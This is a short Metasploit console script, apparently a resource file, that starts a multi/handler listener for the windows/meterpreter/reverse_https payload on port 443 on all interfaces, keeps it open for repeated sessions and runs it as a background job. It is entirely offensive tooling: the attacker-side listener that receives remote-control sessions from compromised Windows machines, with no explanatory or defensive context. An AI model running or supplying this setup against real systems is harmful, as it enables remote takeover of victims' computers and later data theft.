use multi/handler
set payload windows/meterpreter/reverse_https
set LPORT 443
set LHOST 0.0.0.0
set ExitOnSession false
exploit -j